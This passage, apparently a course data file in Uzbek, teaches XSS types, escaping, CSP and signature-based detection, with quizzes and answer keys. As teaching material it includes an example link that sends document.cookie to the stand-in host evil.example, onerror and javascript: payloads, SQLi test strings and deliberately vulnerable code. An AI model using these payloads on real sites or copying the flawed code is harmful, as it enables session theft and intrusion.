      tavsif: "Sahifaga zararli JavaScript kiritish: Reflected, Stored va DOM-based XSS hamda kontekstli ekranlash, CSP.",
      darslar: [
        {
          id: "3-1", nomi: "XSS nima? Reflected XSS", vaqt: 25,
          maqsad: ["XSS ta'rifi va oqibatlarini bilish", "Reflected XSS ketma-ketligini tushunish", "Ekranlash (escaping) mohiyatini bilish"],
          bloklar: [
            { t: "p", h: "<b>Cross-Site Scripting (XSS)</b> bu hujumchi o'z JavaScript kodini boshqa foydalanuvchilar ko'radigan sahifaga kiritishi. Brauzer bu kodni sayt o'zining kodi deb hisoblaydi va saytning barcha huquqlari bilan bajaradi." },
            { t: "img", src: "img/xss-turlari.svg", cap: "8-rasm. XSS ning uch asosiy turi" },
            { t: "h2", h: "XSS bilan nima qilish mumkin?" },
            { t: "list", items: [
              "<b>Sessiyani o'g'irlash:</b> <code>document.cookie</code> ni hujumchi serveriga yuborish (agar cookie HttpOnly bo'lmasa).",
              "<b>Foydalanuvchi nomidan amal bajarish:</b> parolni o'zgartirish, pul o'tkazish, xabar yuborish.",
              "<b>Fishing:</b> sahifaga soxta login formasini chiqarish.",
              "<b>Klaviatura kuzatuvi</b> (keylogger) va sahifani buzish (defacement).",
              "<b>Zararli dastur tarqatish</b> yoki boshqa saytga yo'naltirish."
            ] },
            { t: "h2", h: "Reflected (aks ettirilgan) XSS" },
            { t: "p", h: "Zararli skript so'rovning o'zida (odatda URL parametrida) keladi va server uni darhol javob sahifasiga qaytaradi. Hujumchi qurbonga maxsus havola yuborib, uni bosishga undaydi." },
            { t: "img", src: "img/xss-reflected.svg", cap: "9-rasm. Reflected XSS hujumining ketma-ketligi" },
            { t: "code", lang: "python", kind: "bad", title: "Zaif qidiruv sahifasi (Flask)", code: "from flask import Flask, request\napp = Flask(__name__)\n\n@app.route(\"/search\")\ndef search():\n    q = request.args.get(\"q\", \"\")\n    # XATO: q to'g'ridan-to'g'ri HTML ga qo'shilmoqda\n    return f\"<h2>Natijalar: {q}</h2>\"" },
            { t: "p", h: "Hujumchi havolasi: <code>/search?q=&lt;script&gt;fetch('//evil.example/?c='+document.cookie)&lt;/script&gt;</code>. Qurbon bossa, cookie hujumchiga ketadi." },
            { t: "code", lang: "python", kind: "good", title: "Xavfsiz: ekranlash", code: "from markupsafe import escape   # Flask bilan birga keladi\n\n@app.route(\"/search\")\ndef search():\n    q = request.args.get(\"q\", \"\")\n    return f\"<h2>Natijalar: {escape(q)}</h2>\"\n\n# Yoki Jinja2 shabloni: {{ q }} avtomatik ekranlanadi" },
            { t: "h2", h: "Ekranlash (escaping) nima?" },
            { t: "p", h: "HTML'da maxsus ma'noga ega belgilar <b>HTML entity</b>larga almashtiriladi. Shunda brauzer ularni teg sifatida emas, oddiy matn sifatida ko'rsatadi." },
            { t: "table", head: ["Belgi", "Entity", "Nima uchun xavfli"], rows: [
              ["<code>&lt;</code>", "<code>&amp;lt;</code>", "Yangi teg ochadi"],
              ["<code>&gt;</code>", "<code>&amp;gt;</code>", "Tegni yopadi"],
              ["<code>&amp;</code>", "<code>&amp;amp;</code>", "Entity boshlanadi"],
              ["<code>\"</code>", "<code>&amp;quot;</code>", "Atribut qiymatidan chiqadi"],
              ["<code>'</code>", "<code>&amp;#x27;</code>", "Atribut qiymatidan chiqadi"]
            ] },
            { t: "code", file: "04_xss_ekranlash.py", lang: "python" },
            { t: "h2", h: "O'zingiz sinab ko'ring" },
            { t: "p", h: "Simulyatorda izoh yozing va natijani ko'ring. Zaif rejimda ham haqiqiy skript bajarilmaydi: platforma uni xavfsiz <code>sandbox</code> ichida ko'rsatadi va nima sodir bo'lishi mumkinligini ogohlantirish bilan bildiradi." },
            { t: "lab", id: "xss" }
          ],
          test: [
            { q: "XSS hujumida zararli kod qayerda bajariladi?", o: ["Ma'lumotlar bazasida", "Veb serverda", "Qurbonning brauzerida", "DNS serverda"], a: 2, e: "XSS klient tomonidagi hujum." },
            { q: "Reflected XSS'da zararli skript odatda qayerdan keladi?", o: ["Bazadan", "So'rov parametridan (URL)", "CSS fayldan", "Serverning konfiguratsiyasidan"], a: 1, e: "Skript so'rovda keladi va javobda aks etadi." },
            { q: "<code>&lt;</code> belgisining HTML entity ko'rinishi?", o: ["&amp;gt;", "&amp;lt;", "&amp;quot;", "%3C"], a: 1, e: "&lt; = less than." },
            { q: "Python'da HTML ekranlash uchun standart funksiya?", o: ["html.escape()", "re.escape()", "urllib.quote()", "str.strip()"], a: 0, e: "html.escape(s, quote=True)." }
          ]
        },
        {
          id: "3-2", nomi: "Stored va DOM-based XSS", vaqt: 25,
          maqsad: ["Stored XSS nima uchun eng xavfli ekanini tushunish", "DOM-based XSS manba (source) va chiqish (sink) tushunchalarini bilish", "Mehmonlar kitobi laboratoriyasini ishga tushirish"],
          bloklar: [
            { t: "h2", h: "Stored (saqlangan) XSS" },
            { t: "p", h: "Hujumchi zararli kodni bir marta saytga yozadi (izoh, profil nomi, forum xabari), sayt uni bazaga saqlaydi va keyin <b>sahifani ochgan har bir foydalanuvchiga</b> ko'rsatadi. Qurbon hech qanday havolani bosishi shart emas, shuning uchun bu turdagi XSS eng xavfli hisoblanadi." },
            { t: "img", src: "img/xss-stored.svg", cap: "10-rasm. Stored XSS: bitta yozuv barcha mehmonlarga ta'sir qiladi" },
            { t: "note", k: "danger", title: "Tarixiy misol: Samy qurti (2005)", h: "MySpace ijtimoiy tarmog'idagi Stored XSS orqali tarqalgan qurt 20 soatda 1 milliondan ortiq profilga yozildi. Har bir profil ochilganda skript o'zini ko'ruvchining profiliga ko'chirgan." },
            { t: "h3", h: "Laboratoriya: Mehmonlar kitobi" },
            { t: "p", h: "Quyidagi server faqat Python standart kutubxonasidan foydalanadi. Uni ikki rejimda ishga tushirib, <code>&lt;img src=x onerror=alert(1)&gt;</code> xabarini yuboring va farqni kuzating." },
            { t: "code", lang: "bash", title: "Ishga tushirish", code: "python 05_xss_mehmonlar_kitobi.py zaif     # zaif rejim\npython 05_xss_mehmonlar_kitobi.py          # xavfsiz rejim (ekranlash + CSP)\n# Brauzerda: http://127.0.0.1:8000" },
            { t: "code", file: "05_xss_mehmonlar_kitobi.py", lang: "python" },
            { t: "h2", h: "DOM-based XSS" },
            { t: "p", h: "Bu turda server umuman ishtirok etmaydi: zaiflik sahifadagi <b>JavaScript kodining o'zida</b>. Skript ishonchsiz manbadan (source) ma'lumot olib, uni xavfli joyga (sink) yozadi." },
            { t: "img", src: "img/xss-dom.svg", cap: "11-rasm. DOM-based XSS: # dan keyingi qism serverga umuman bormaydi" },
            { t: "table", head: ["Manbalar (source)", "Xavfli chiqishlar (sink)"], rows: [
              ["<code>location.hash</code>, <code>location.search</code>", "<code>element.innerHTML</code>, <code>outerHTML</code>"],
              ["<code>document.referrer</code>", "<code>document.write()</code>"],
              ["<code>window.name</code>", "<code>eval()</code>, <code>setTimeout(\"matn\")</code>, <code>new Function()</code>"],
              ["<code>postMessage</code> ma'lumoti", "<code>element.setAttribute(\"onclick\", ...)</code>"],
              ["<code>localStorage</code>", "<code>a.href = ...</code> (<code>javascript:</code> URL)"]
            ] },
            { t: "code", lang: "javascript", kind: "bad", title: "Zaif: innerHTML", code: "// URL: https://sayt.uz/salom#Ali\nconst ism = decodeURIComponent(location.hash.slice(1));\ndocument.getElementById(\"salom\").innerHTML = \"Salom, \" + ism;\n// Hujum: https://sayt.uz/salom#<img src=x onerror=alert(document.domain)>" },
            { t: "code", lang: "javascript", kind: "good", title: "Xavfsiz: textContent", code: "const ism = decodeURIComponent(location.hash.slice(1));\ndocument.getElementById(\"salom\").textContent = \"Salom, \" + ism;\n// textContent HTML ni tahlil qilmaydi, teglar oddiy matn bo'lib ko'rinadi" },
            { t: "algo", title: "DOM-based XSS ni kod ichidan topish algoritmi", steps: [
              "JS fayllarda manbalarni qidirish: <code>location</code>, <code>document.referrer</code>, <code>window.name</code>, <code>postMessage</code>.",
              "Har bir manba qiymati qaysi o'zgaruvchilarga o'tishini kuzatish (taint tracking).",
              "Shu o'zgaruvchilar xavfli sink'larga (<code>innerHTML</code>, <code>eval</code>, <code>document.write</code>) yetib borishini tekshirish.",
              "Yo'lda ekranlash yoki tozalash bo'lmasa, zaiflik bor deb belgilash.",
              "Tuzatish: <code>innerHTML</code> → <code>textContent</code>, <code>eval</code> → <code>JSON.parse</code>, URL uchun <code>http(s)</code> sxemasini tekshirish."
            ] },
            { t: "h2", h: "Uch turni solishtirish" },
            { t: "table", head: ["", "Reflected", "Stored", "DOM-based"], rows: [
              ["Skript qayerda saqlanadi", "Saqlanmaydi (URL'da)", "Server bazasida", "Saqlanmaydi (URL/DOM)"],
              ["Server javobida bormi", "Ha", "Ha", "Yo'q bo'lishi mumkin"],
              ["Qurbon nima qilishi kerak", "Havolani bosish", "Sahifani ochish", "Havolani bosish"],
              ["Xavf darajasi", "O'rta / Yuqori", "Juda yuqori", "O'rta / Yuqori"],
              ["Asosiy himoya", "Server ekranlashi", "Server ekranlashi", "Xavfsiz DOM API'lar"]
            ] }
          ],
          test: [
            { q: "Qaysi XSS turida qurbon havolani bosishi shart emas?", o: ["Reflected", "Stored", "DOM-based", "Hech qaysi"], a: 1, e: "Saqlangan skript sahifani ochgan har kimda ishlaydi." },
            { q: "DOM-based XSS'da qaysi xususiyat xavfsiz?", o: ["innerHTML", "textContent", "outerHTML", "document.write"], a: 1, e: "textContent matnni HTML sifatida tahlil qilmaydi." },
            { q: "<code>location.hash</code> qiymati serverga yuboriladimi?", o: ["Ha, har doim", "Yo'q, # qismi brauzerda qoladi", "Faqat POST'da", "Faqat HTTPS'da"], a: 1, e: "Fragment (#...) serverga yuborilmaydi, shuning uchun server loglarida ko'rinmaydi." },
            { q: "Quyidagilardan qaysi biri sink emas?", o: ["eval()", "innerHTML", "document.write()", "JSON.parse()"], a: 3, e: "JSON.parse kodni bajarmaydi, faqat ma'lumot tahlil qiladi." }
          ]
        },
        {
          id: "3-3", nomi: "XSS'dan himoya", vaqt: 30,
          maqsad: ["Kontekstga mos ekranlashni qo'llash", "HTML tozalovchi (sanitizer) qanday ishlashini bilish", "CSP va HttpOnly cookie sozlash"],
          bloklar: [
            { t: "p", h: "XSS'ga qarshi asosiy qoida: <b>ma'lumotni chiqarish joyiga (kontekstga) mos ravishda ekranlash</b>. Bitta universal funksiya yo'q, chunki HTML matni, atribut, JavaScript va URL turli qoidalarga ega." },
            { t: "h2", h: "1. Kontekstga mos ekranlash" },
            { t: "table", head: ["Kontekst", "Misol", "Himoya"], rows: [
              ["HTML matni", "<code>&lt;p&gt;{x}&lt;/p&gt;</code>", "<code>html.escape(x)</code>"],
              ["HTML atributi", "<code>&lt;input value=\"{x}\"&gt;</code>", "<code>html.escape(x, quote=True)</code> va atributni doim qo'shtirnoqda yozish"],
              ["JavaScript ichida", "<code>&lt;script&gt;let a = {x}&lt;/script&gt;</code>", "<code>json.dumps(x)</code> + <code>&lt;/</code> ni <code>&lt;\\/</code> ga almashtirish, yaxshisi data-atribut orqali uzatish"],
              ["URL parametri", "<code>&lt;a href=\"/s?q={x}\"&gt;</code>", "<code>urllib.parse.quote(x)</code>"],
              ["To'liq URL", "<code>&lt;a href=\"{x}\"&gt;</code>", "Faqat <code>http://</code>, <code>https://</code> sxemasiga ruxsat"],
              ["CSS", "<code>style=\"color: {x}\"</code>", "Oq ro'yxatdagi qiymatlar"]
            ] },
            { t: "lab", id: "escape" },
            { t: "h2", h: "2. Shablon dvigatellari" },
            { t: "p", h: "Jinja2, Django shablonlari, React avtomatik ekranlaydi. Xavf ekranlashni <b>o'chirganda</b> paydo bo'ladi:" },
            { t: "table", head: ["Texnologiya", "Xavfsiz", "Xavfli"], rows: [
              ["Jinja2 / Flask", "<code>{{ x }}</code>", "<code>{{ x | safe }}</code>, <code>Markup(x)</code>"],
              ["Django", "<code>{{ x }}</code>", "<code>{{ x | safe }}</code>, <code>mark_safe(x)</code>"],
              ["React", "<code>{x}</code>", "<code>dangerouslySetInnerHTML</code>"],
              ["Vue", "<code>{{ x }}</code>", "<code>v-html</code>"]
            ] },
            { t: "h2", h: "3. HTML tozalash (sanitization)" },
            { t: "p", h: "Ba'zan foydalanuvchiga formatlash kerak (qalin matn, havola). Bunda ekranlash emas, <b>oq ro'yxatga asoslangan tozalash</b> ishlatiladi: ruxsat berilgan teglar va atributlar qoladi, qolgani o'chiriladi." },
            { t: "algo", title: "Oq ro'yxatli HTML tozalash algoritmi", steps: [
              "HTML ni parser yordamida teglar va matnga ajratish (regex bilan emas!).",
              "Har bir ochuvchi teg uchun: teg oq ro'yxatda bo'lmasa, uni tashlab yuborish.",
              "<code>script</code>, <code>style</code> teglarini ichidagi matn bilan birga o'chirish.",
              "Ruxsat berilgan teglarning faqat ruxsat berilgan atributlarini qoldirish (<code>on*</code> hodisalar doim o'chiriladi).",
              "<code>href</code>/<code>src</code> qiymati faqat <code>http</code>, <code>https</code>, <code>mailto</code> bilan boshlansa qoldirish.",
              "Barcha matn qismlarini <code>html.escape()</code> qilish va yopilmagan teglarni yopish."
            ] },
            { t: "code", file: "07_html_sanitizer.py", lang: "python", kind: "good" },
            { t: "note", k: "warn", title: "Amaliy maslahat", h: "O'zingiz yozgan tozalovchini real loyihada ishlatmang. Sinovdan o'tgan kutubxonalardan foydalaning: Python'da <code>nh3</code> yoki <code>bleach</code>, JavaScript'da <code>DOMPurify</code>." },
            { t: "h2", h: "4. Content Security Policy (CSP)" },
            { t: "p", h: "CSP bu server yuboradigan HTTP sarlavha. U brauzerga qaysi manbalardan skript yuklash mumkinligini aytadi. XSS kiritilgan taqdirda ham, inline skript va begona domen skriptlari bajarilmaydi." },
            { t: "img", src: "img/csp.svg", cap: "12-rasm. CSP ruxsat bermagan skriptlarni bloklaydi" },
            { t: "h2", h: "5. HttpOnly, Secure, SameSite cookie" },
            { t: "p", h: "<code>HttpOnly</code> bayrog'i cookie'ni <code>document.cookie</code> orqali o'qishni taqiqlaydi. Bu XSS bo'lsa ham sessiya o'g'irlanishini qiyinlashtiradi." },
            { t: "code", file: "08_xavfsizlik_sarlavhalari.py", lang: "python", kind: "good" },
            { t: "h2", h: "Himoya nazorat ro'yxati" },
            { t: "list", items: [
              "✅ Shablon dvigatelining avtomatik ekranlashi yoqilgan, <code>|safe</code> ishlatilmagan.",
              "✅ Har bir chiqish joyi uchun to'g'ri kontekst ekranlashi.",
              "✅ JS'da <code>innerHTML</code> o'rniga <code>textContent</code>, <code>eval</code> ishlatilmaydi.",
              "✅ Foydalanuvchi HTML'i oq ro'yxatli sanitizer orqali o'tadi.",
              "✅ CSP sarlavhasi o'rnatilgan, <code>'unsafe-inline'</code> yo'q.",
              "✅ Sessiya cookie'si <code>HttpOnly; Secure; SameSite</code>."
            ] }
          ],
          test: [
            { q: "<code>&lt;a href=\"{x}\"&gt;</code> da x = <code>javascript:alert(1)</code>. html.escape() himoya qiladimi?", o: ["Ha, to'liq", "Yo'q, URL sxemasini ham tekshirish kerak", "Faqat Chrome'da", "Ha, agar quote=False bo'lsa"], a: 1, e: "javascript: da maxsus HTML belgisi yo'q, shuning uchun sxemani tekshirish kerak." },
            { q: "CSP qayerda o'rnatiladi?", o: ["Ma'lumotlar bazasida", "HTTP javob sarlavhasida", "Cookie ichida", "CSS faylda"], a: 1, e: "Content-Security-Policy: ... sarlavhasi." },
            { q: "HttpOnly bayrog'i nimaga to'sqinlik qiladi?", o: ["HTTP orqali yuborishga", "JavaScript orqali cookie o'qishga", "Cookie saqlashga", "HTTPS ga"], a: 1, e: "document.cookie HttpOnly cookie'ni ko'rmaydi." },
            { q: "React'da qaysi xususiyat XSS xavfini tug'diradi?", o: ["{x}", "className", "dangerouslySetInnerHTML", "useState"], a: 2, e: "U ekranlashni chetlab o'tadi." },
            { q: "HTML tozalashda nima uchun regex emas, parser ishlatiladi?", o: ["Regex sekin", "HTML murakkab va regex ko'p holatlarni o'tkazib yuboradi", "Parser bepul", "Regex Python'da yo'q"], a: 1, e: "Brauzerlar noto'g'ri HTML'ni ham turli usulda tahlil qiladi." }
          ]
        }
      ]
    },

    /* ======================= 4-MODUL ======================= */
    {
      id: "amaliyot", nomi: "Amaliyot", toliq: "Aniqlash va amaliyot", icon: "🧪", rang: "dark",
      tavsif: "Hujumlarni aniqlash algoritmi, mini-WAF Python'da, xavfsiz dasturlash qoidalari va atamalar lug'ati.",
      darslar: [
        {
          id: "4-1", nomi: "Hujumlarni aniqlash algoritmi", vaqt: 30,
          maqsad: ["Imzoga asoslangan aniqlash algoritmini tushunish", "Normallashtirish nima uchun kerakligini bilish", "Mini-WAF ni Python'da yozish"],
          bloklar: [
            { t: "p", h: "Himoyaning asosiy qismi kodda bo'ladi, lekin hujumlarni <b>aniqlash</b> ham muhim: monitoring, jurnal yuritish va hodisalarga tez javob berish uchun. Eng oddiy usul: <b>imzoga asoslangan</b> (signature-based) aniqlash." },
            { t: "img", src: "img/algoritm-blok.svg", cap: "13-rasm. Kiruvchi ma'lumotni xavfsiz qayta ishlash algoritmining blok-sxemasi" },
            { t: "h2", h: "Normallashtirish" },
            { t: "p", h: "Hujumchilar filtrdan o'tish uchun yuklamani kodlaydi: <code>%27</code> (URL), <code>&amp;#39;</code> (HTML entity), katta-kichik harflar (<code>ScRiPt</code>), qo'shimcha bo'shliqlar. Shuning uchun tekshirishdan oldin matn bir ko'rinishga keltiriladi." },
            { t: "table", head: ["Asl kiritish", "Normallashtirilgandan keyin"], rows: [
              ["<code>%27%20OR%201%3D1</code>", "<code>' or 1=1</code>"],
              ["<code>&amp;lt;ScRiPt&amp;gt;</code>", "<code>&lt;script&gt;</code>"],
              ["<code>%2527</code> (ikki marta kodlangan)", "<code>'</code>"],
              ["<code>UNION&nbsp;&nbsp;&nbsp;SELECT</code>", "<code>union select</code>"]
            ] },
            { t: "h2", h: "Ballga asoslangan algoritm" },
            { t: "algo", title: "Mini-WAF aniqlash algoritmi", steps: [
              "Kiritish matnini olish.",
              "Takrorlash: URL decode va HTML entity decode, toki matn o'zgarmay qolguncha.",
              "Bo'shliqlarni bittaga keltirish va kichik harfga o'tkazish.",
              "Ball = 0. Har bir qoida (regex, ball) uchun: agar regex topilsa, ball += qoida bali.",
              "Agar ball ≥ chegara (masalan, 4) bo'lsa → BLOKLASH va jurnalga yozish.",
              "Aks holda → RUXSAT (lekin keyingi qatlamlar baribir ishlaydi)."
            ] },
            { t: "code", file: "06_hujum_aniqlovchi.py", lang: "python" },
            { t: "h2", h: "Interaktiv aniqlovchi" },
            { t: "p", h: "Xuddi shu algoritm JavaScript'ga ko'chirilgan. Matn yozing va qaysi qoidalar ishlaganini ko'ring. <code>O'zbekiston</code> so'zidagi apostrof nima uchun bloklanmaganiga e'tibor bering." },
            { t: "lab", id: "waf" },
            { t: "note", k: "warn", title: "Imzoga asoslangan aniqlashning kamchiliklari", h: "<b>Noto'g'ri musbat</b> (false positive): oddiy matn bloklanadi (masalan, forumdagi \"&lt;img&gt; tegida onclick= nima qiladi?\" degan oddiy savol). <b>Noto'g'ri manfiy</b> (false negative): yangi yoki yaxshi niqoblangan hujum o'tib ketadi. Shuning uchun WAF hech qachon parametrlangan so'rov va ekranlashning o'rnini bosmaydi." },
            { t: "h2", h: "Algoritmlarni solishtirish" },
            { t: "table", head: ["Usul", "Afzalligi", "Kamchiligi"], rows: [
              ["Imzo (regex)", "Oddiy, tez, tushunarli", "Yangi hujumlarni ko'rmaydi, aylanib o'tish oson"],
              ["Anomaliya (statistik)", "Noma'lum hujumlarni ham sezadi", "Ko'p noto'g'ri signal, o'qitish kerak"],
              ["SQL tokenizatsiya (libinjection)", "Kiritishni SQL sifatida tahlil qiladi, aniqroq", "Murakkabroq"],
              ["Mashinali o'qitish", "Murakkab naqshlarni topadi", "Ma'lumot to'plami va resurs talab qiladi"]
            ] }
          ],
          test: [
            { q: "Normallashtirish nima uchun kerak?", o: ["Matnni qisqartirish uchun", "Kodlangan yuklamalarni ochib, filtrdan o'tishning oldini olish uchun", "Parolni shifrlash uchun", "Tezlikni oshirish uchun"], a: 1, e: "%27 va &#39; kabi kodlashlar ' belgisiga aylanadi." },
            { q: "Oddiy foydalanuvchi matni bloklansa, bu qanday ataladi?", o: ["False negative", "False positive", "True positive", "Zero-day"], a: 1, e: "Noto'g'ri musbat signal." },
            { q: "WAF parametrlangan so'rovning o'rnini bosadimi?", o: ["Ha", "Yo'q, u faqat qo'shimcha qatlam", "Faqat MySQL'da", "Faqat HTTPS bilan"], a: 1, e: "WAF ni aylanib o'tish mumkin, kod darajasidagi himoya asosiy." },
            { q: "<code>%2527</code> ikki marta decode qilinsa nima hosil bo'ladi?", o: ["%27", "'", "\"", "25"], a: 1, e: "%2527 → %27 → '." }
          ]
        },
        {
          id: "4-2", nomi: "Xavfsiz dasturlash va lug'at", vaqt: 15,
          maqsad: ["Kurs bo'yicha bilimlarni umumlashtirish", "Xavfsiz dasturlash qoidalarini eslab qolish", "Asosiy atamalarni bilish"],
          bloklar: [
            { t: "h2", h: "Oltin qoidalar" },
            { t: "table", head: ["#", "Qoida", "SQLi", "XSS"], rows: [
              ["1", "Ma'lumot va kodni ajrating", "Parametrlangan so'rov", "Kontekstli ekranlash, textContent"],
              ["2", "Kiritishni tekshiring (oq ro'yxat)", "id raqam, login formati", "Ruxsat etilgan teglar, URL sxemalar"],
              ["3", "Minimal huquqlar", "Cheklangan DB foydalanuvchi", "HttpOnly cookie, CSP"],
              ["4", "Xatolarni yashiring, lekin jurnalga yozing", "Umumiy xato sahifasi", "CSP report-uri"],
              ["5", "Tayyor, sinalgan vositalardan foydalaning", "ORM, drayver parametrlari", "Jinja2, DOMPurify, nh3"],
              ["6", "Muntazam sinang", "sqlmap (o'z tizimingizda)", "OWASP ZAP, Burp Suite"]
            ] },
            { t: "h2", h: "Mashq qilish uchun qonuniy muhitlar" },
            { t: "list", items: [
              "<b>DVWA</b> (Damn Vulnerable Web Application): o'z kompyuteringizga o'rnatiladigan zaif ilova.",
              "<b>OWASP Juice Shop</b>: zamonaviy zaif onlayn do'kon (Node.js).",
              "<b>PortSwigger Web Security Academy</b>: bepul onlayn laboratoriyalar.",
              "<b>Ushbu kursdagi Python misollar</b>: <code>python/</code> papkasida, faqat lokal ishlaydi."
            ] },
            { t: "h2", h: "Atamalar lug'ati" },
            { t: "gloss", items: [
              ["Payload (yuklama)", "Hujum uchun maxsus tuzilgan kiritish matni."],
              ["Konkatenatsiya", "Matnlarni + yoki f-string bilan qo'shish."],
              ["Parametrlangan so'rov", "So'rov shabloni va qiymatlar alohida yuboriladigan usul."],
              ["Prepared statement", "Oldindan tayyorlangan (kompilyatsiya qilingan) SQL so'rov."],
              ["Ekranlash (escaping)", "Maxsus belgilarni xavfsiz ko'rinishga almashtirish."],
              ["Sanitization", "Xavfli qismlarni olib tashlash orqali tozalash."],
              ["Validatsiya", "Kiritish kutilgan formatga mosligini tekshirish."],
              ["Allowlist (oq ro'yxat)", "Faqat ruxsat etilganlar ro'yxati."],
              ["Denylist (qora ro'yxat)", "Taqiqlanganlar ro'yxati. Ishonchsiz usul."],
              ["Oracle", "Blind SQLi'da rost/yolg'on javob beruvchi mexanizm."],
              ["Source / Sink", "DOM XSS'da ma'lumot manbai / xavfli chiqish joyi."],
              ["CSP", "Content Security Policy, skript manbalarini cheklovchi sarlavha."],
              ["HttpOnly", "JS orqali o'qib bo'lmaydigan cookie bayrog'i."],
              ["WAF", "Web Application Firewall, veb so'rovlar filtri."],
              ["OWASP", "Veb xavfsizligi bo'yicha xalqaro hamjamiyat."],
              ["False positive", "Xavfsiz narsani xato ravishda hujum deb topish."]
            ] },
            { t: "note", k: "ok", title: "Tabriklaymiz!", h: "Siz kursning barcha darslarini ko'rib chiqdingiz. Endi <a href=\"#/test\">yakuniy test</a>ni topshirib, bilimingizni tekshiring." }
          ],
          test: [
            { q: "Nima uchun denylist (qora ro'yxat) ishonchsiz?", o: ["U sekin", "Barcha xavfli variantlarni oldindan sanab bo'lmaydi", "U bepul emas", "U faqat SQL uchun"], a: 1, e: "Hujumchilar doim yangi aylanma yo'l topadi." },
            { q: "O'z kompyuteringizda SQLi mashq qilish uchun qaysi biri mos?", o: ["Bankning sayti", "DVWA", "Davlat portali", "Do'stingizning sayti"], a: 1, e: "DVWA aynan o'quv uchun yaratilgan." },
            { q: "\"Ma'lumot va kodni ajratish\" SQLi uchun nimani bildiradi?", o: ["HTTPS", "Parametrlangan so'rov", "Parolni xeshlash", "Backup"], a: 1, e: "Qiymatlar so'rov matniga qo'shilmaydi." }
          ]
        }
      ]
    }
  ]
};
